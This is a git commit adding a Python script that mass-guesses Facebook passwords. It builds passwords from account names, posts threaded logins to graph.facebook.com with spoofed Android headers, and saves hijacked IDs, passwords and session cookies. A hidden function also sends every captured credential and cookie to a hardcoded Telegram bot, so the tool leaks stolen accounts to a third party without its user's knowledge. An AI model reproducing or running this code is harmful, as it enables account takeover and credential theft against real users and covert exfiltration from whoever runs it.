ae44000e19a1a277623558b3d337b38a688501d5
Ronish-EXE <154495032+Ronishxtha1@users.noreply.github.com>
2024-06-03 00:32:16 +0545

    Add files via upload

---
+++ roman.py
@@ -0,0 +1,155 @@
+#----------------import-module--------------#
+import os,time,sys
+os.system('clear')
+from os import path
+import os,base64,zlib,pip,urllib
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system(f'pip install requests futures==2 > /dev/null')
+except:pass
+import os,uuid,random,httpx,json,sys
+from time import sleep as slp
+def Elite(ids,pas,cookie):
+    try:
+        token = "6847654306:AAGcfaUqwvkM22yBIA1emeOFfpvVfhWrlaE" 
+        chatid = "6427525936"
+        ok_id =str(ids+'|'+pas+'|'+cookie)
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        params = {"chat_id": chatid, "text": ok_id}
+        kj=requests.get(url, params=params)
+    except:
+        pass
+#-----------colors------------#
+G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
+W='\033[1;37m';G='\033[1;32m';R='\033[1;31m';B='\033[1;34m';A='\033[1;36m';C='\033[1;35m';Y='\033[1;33m';X='\x1b[38;5;208m';F='\033[1;35m'
+#----------------normal-file-method-user-agent--------------#
+def uax():
+	model = random.choice(['Redmi 6','Redmi 7','Redmi 8','Redmi 5','Redmi 4','Redmi 3','Redmi 2'])
+	fblc = random.choice(["en_GB","en_US"])
+	rt = random.choice(["FB4A","EMA"])
+	fbca = random.choice(["armeabi-v7a:armeabi","arm64-v8a:"])
+	fbcr = random.choice(["AIS','cricket","MegaFon","Viettel Telecom","TRUE-H","TM","GLOBE","null","VIETTEL","TELCEL","O2-CZ","U.S. Cellular","SUN","TelkomSA","Verizon","Plus","Claro BR","T-Mobile","airtel","PLAY (T-Mobile)","VIVACOM","lifecell","Yoigo","life:) BY","vodafone.de","Vodafone","PosteMobile","Verizon Wireless","Movistar","HOME","SAZKAmobilCZ","Astelit-LIFE;FBMF","AT&amp;amp-T","Grameenphone","Robi","Banglalink","Willkommen"])
+	fbav = str(random.randint(111,999))+'.0.0.'+str(random.randint(11,99))+'.'+str(random.randint(111,999))
+	fbbv = str(random.randint(4000000,5000000))
+	fbsv = str(random.randint(6,14))
+	bal = '[FBAN/'+str(rt)+';FBAV/'+str(fbav)+';FBBV/'+str(fbbv)+';FBDM/' + '{density=2.75,width=1080,height=2168}' +';FBLC/'+str(fblc)+';FBRV/'+str(fbbv )+';FBCR/'+str(fbcr)+';FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/'+str(model)+';FBSV/'+str(fbsv)+';FBOP/1;FBCA/'+str(fbca)+';]'
+	return bal
+def PINIK_M1():
+        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/90.0.0.5781;FBBV/3267214;[FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1"
+        return ua
+#---------------logo---------------#
+logo=(f"""\033[1;37m
+
+{G0}  _____   ____  _   _ _____  _____ _    _ 
+{G1} |  __ \ / __ \| \ | |_   _|/ ____| |  | |
+{G2} | |__) | |  | |  \| | | | | (___ | |__| |
+{G3} |  _  /| |  | | . ` | | |  \___ \|  __  |
+{G4} | | \ \| |__| | |\  |_| |_ ____) | |  | |
+{G0} |_|  \_\\____/|_| \_|_____|_____/|_|  |_|
+                                          
+               version:0.1
+{F}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+#----------------line-------------#
+def linex():
+        print(f'{F}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+#--------------clear-def------------#
+def clear():
+        os.system('clear')
+        print(logo)
+#--------------loop-list--------------#
+loop=0;oks=[];cps=[];pcp=[];id=[];ugen=[];ugen2=[];tokenku=[]
+#------------main-menu--------------#
+def menu():
+	clear()
+	print(f'{R}|{G}1{R}|{G} File Cloning {R}|{G}MIX{R}|')
+	print(f'{R}|{G}0{R}|{G} Exit Programme')
+	linex()
+	rumi = input(f'{R}|{G}■{R}|{W} Choice On Option {R}:{G} ')
+	if rumi in '1':
+		file()
+	if rumi in '0':
+		exit()
+	else:
+		exit()
+#------------file-check----------#
+def file():
+                                clear()
+                                print(f'{R}|{G}■{R}|{W} Put file example{R}:{G}  /sdcard/File.txt  etc...>')
+                                linex()
+                                file = input(f'{R}|{G}■{R}|{W} Put file path\033[1;31m:{G} ')
+                                try:
+                                        fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(f'{R}|{G}■{R}|{G} File location not found ')
+                                        time.sleep(1)
+                                        menu()
+                                clear()
+                                plist = []
+                                try:
+                                        ps_limit = int(input(f'{R}|{G}■{R}|{G} How many passwords do you want to add ? '))
+                                except:
+                                        ps_limit =1
+                                linex()
+                                print(f'{R}|{G}■{R}|{W} exp{R}:{G} first last,firtslast,first123')
+                                linex()
+                                for i in range(ps_limit):
+                                        plist.append(input(f'{R}|{G}■{R}|{W} Put password {i+1}{R}: {G}'))
+                                linex()
+                                with tred(max_workers=30) as crack_submit:
+                                        clear()
+                                        total_ids = str(len(fo))
+                                        print(f'{R}|{G}■{R}|{W} Total account {R}: \033[1;32m'+total_ids+f' \033[1;33m')
+                                        print(f'{R}|{G}■{R}|{G} TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY {R}3{G} MIN')
+                                        linex()
+                                        for user in fo:
+                                                ids,names = user.split('|')
+                                                passlist = plist
+                                                crack_submit.submit(ffb,ids,names,passlist)
+                                print('\033[1;37m')
+                                linex()
+                                print(f'{R}|{G}■{R}|{G} The process has completed')
+                                print(f'{R}|{G}■{R}|{G} Total OK/CP{R}:{G} '+str(len(oks))+'/'+str(len(cps)))
+                                linex()
+                                input(f'{R}|{G}■{R}|{G} Press enter to back ')
+                                os.system('python ronish.py')
+#-----------------file-method---------------#
+def ffb(ids,names,passlist):
+    global oks,cps,loop
+    try:
+        fn=names.split(' ')[0]
+        try:
+            ln=names.split(' ')[1]
+        except:
+            ln=fn
+        for pw in passlist:
+            sys.stdout.write(f'\r\r{R}|{G}■{R}| |{G}Ronish-XD{R}|{A}-{R}|{G}%s{R}|{A}-{R}|{G}OK{R}:{G}%s{R}|{A}-{R}|{G}CP{R}:{G}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
+            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'User-Agent': PINIK_M1(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url='https://graph.facebook.com/auth/login'
+            req=httpx.post(url,data=data,headers=head).json()
+            if 'session_key' in req:
+                print(f'\r\r{R}|{G}■{R}||{G}Ronish-OK{R}|{G} '+ids+' | '+pas)
+                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
+                Elite(ids,pas,cookie)
+                open('/sdcard/ronish-file-clone-OK.txt','a').write(ids+' | '+pas+ ' | ' +cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in req['error']['message']:
+               # print(f'\r\r{R}|{G}■{R}||{X}Ronish-CP{R}|{X} '+ids+' | '+pas)
+                open('/sdcard/ronish-file-clone-CP.txt','a').write(ids+' | '+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#---------------end------------#
+menu()
+	
